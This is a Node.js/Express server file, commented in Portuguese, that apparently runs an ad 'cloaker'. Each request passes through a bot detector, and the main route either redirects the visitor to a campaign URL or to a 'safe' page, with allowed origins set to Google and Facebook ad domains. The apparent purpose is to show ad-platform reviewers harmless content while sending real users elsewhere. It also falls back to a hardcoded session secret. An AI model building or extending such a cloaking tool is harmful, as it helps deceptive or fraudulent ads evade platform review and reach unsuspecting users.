require('dotenv').config();
const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const compression = require('compression');
const rateLimit = require('express-rate-limit');
const session = require('express-session');
const path = require('path');
const fs = require('fs');

// Importar módulos do cloaker
const CloakerEngine = require('./src/core/CloakerEngine');
const DatabaseManager = require('./src/database/DatabaseManager');
const Logger = require('./src/utils/Logger');
const SecurityManager = require('./src/security/SecurityManager');
const ProxyManager = require('./src/proxy/ProxyManager');
const BotDetector = require('./src/detection/BotDetector');

const app = express();
const PORT = process.env.PORT || 3000;

// Criar diretórios necessários
const dirs = ['./data', './logs', './uploads', './cache'];
dirs.forEach(dir => {
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
});

// Middleware de segurança
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https:"],
            connectSrc: ["'self'"],
            fontSrc: ["'self'"],
            objectSrc: ["'none'"],
            mediaSrc: ["'self'"],
            frameSrc: ["'none'"]
        }
    },
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    }
}));

// Rate limiting
const limiter = rateLimit({
    windowMs: parseInt(process.env.RATE_LIMIT_WINDOW) || 15 * 60 * 1000,
    max: parseInt(process.env.RATE_LIMIT_MAX) || 100,
    message: {
        error: 'Muitas requisições. Tente novamente mais tarde.',
        code: 'RATE_LIMIT_EXCEEDED'
    },
    standardHeaders: true,
    legacyHeaders: false
});

app.use(limiter);

// Compressão
app.use(compression());

// CORS configurado
app.use(cors({
    origin: function (origin, callback) {
        // Permitir requisições sem origin (mobile apps, etc)
        if (!origin) return callback(null, true);
        
        const allowedOrigins = [
            'https://google.com',
            'https://facebook.com',
            'https://googleads.com',
            'https://business.facebook.com'
        ];
        
        if (allowedOrigins.indexOf(origin) !== -1) {
            callback(null, true);
        } else {
            callback(new Error('Não permitido pelo CORS'));
        }
    },
    credentials: true
}));

// Sessões
app.use(session({
    secret: process.env.SESSION_SECRET || 'default-secret-key',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: process.env.NODE_ENV === 'production',
        httpOnly: true,
        maxAge: 24 * 60 * 60 * 1000 // 24 horas
    }
}));

// Parsers
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Servir arquivos estáticos
app.use(express.static(path.join(__dirname, 'public')));

// Inicializar componentes
const logger = new Logger();
const dbManager = new DatabaseManager();
const securityManager = new SecurityManager();
const proxyManager = new ProxyManager();
const botDetector = new BotDetector();
const cloakerEngine = new CloakerEngine(dbManager, logger, securityManager, proxyManager, botDetector);

// Middleware de logging
app.use((req, res, next) => {
    logger.logRequest(req);
    next();
});

// Middleware de detecção de bots
app.use(async (req, res, next) => {
    try {
        const isBot = await botDetector.detectBot(req);
        req.isBot = isBot;
        next();
    } catch (error) {
        logger.error('Erro na detecção de bot:', error);
        req.isBot = false;
        next();
    }
});

// Rotas principais do cloaker
app.use('/api/cloaker', require('./src/routes/cloakerRoutes'));
app.use('/api/admin', require('./src/routes/adminRoutes'));
app.use('/api/logs', require('./src/routes/logsRoutes'));

// Rota principal do cloaker
app.get('/:campaignId', async (req, res) => {
    try {
        const { campaignId } = req.params;
        const result = await cloakerEngine.processRequest(req, campaignId);
        
        if (result.success) {
            res.redirect(result.redirectUrl);
        } else {
            res.redirect(process.env.SAFE_PAGE || '/safe');
        }
    } catch (error) {
        logger.error('Erro no processamento do cloaker:', error);
        res.redirect(process.env.SAFE_PAGE || '/safe');
    }
});

// Rota de fallback
app.get('/safe', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'safe.html'));
});

// Rota de health check
app.get('/health', (req, res) => {
    res.json({
        status: 'OK',
        timestamp: new Date().toISOString(),
        version: '1.0.0',
        uptime: process.uptime()
    });
});

// Middleware de tratamento de erros
app.use((err, req, res, next) => {
    logger.error('Erro não tratado:', err);
    
    if (req.xhr) {
        res.status(500).json({
            error: 'Erro interno do servidor',
            code: 'INTERNAL_ERROR'
        });
    } else {
        res.status(500).send('Erro interno do servidor');
    }
});

// Inicializar servidor
async function startServer() {
    try {
        // Inicializar banco de dados
        await dbManager.initialize();
        
        // Inicializar componentes (alguns não precisam de initialize)
        logger.info('Componentes inicializados com sucesso');
        
        app.listen(PORT, () => {
            logger.info(`🚀 Cloaker iniciado na porta ${PORT}`);
            logger.info(`📊 Painel admin: http://localhost:${PORT}/admin`);
            logger.info(`🔒 Modo: ${process.env.NODE_ENV || 'development'}`);
        });
    } catch (error) {
        logger.error('Erro ao inicializar servidor:', error);
        process.exit(1);
    }
}

// Graceful shutdown
process.on('SIGTERM', async () => {
    logger.info('Recebido SIGTERM, encerrando servidor...');
    await dbManager.close();
    process.exit(0);
});

process.on('SIGINT', async () => {
    logger.info('Recebido SIGINT, encerrando servidor...');
    await dbManager.close();
    process.exit(0);
});

startServer();
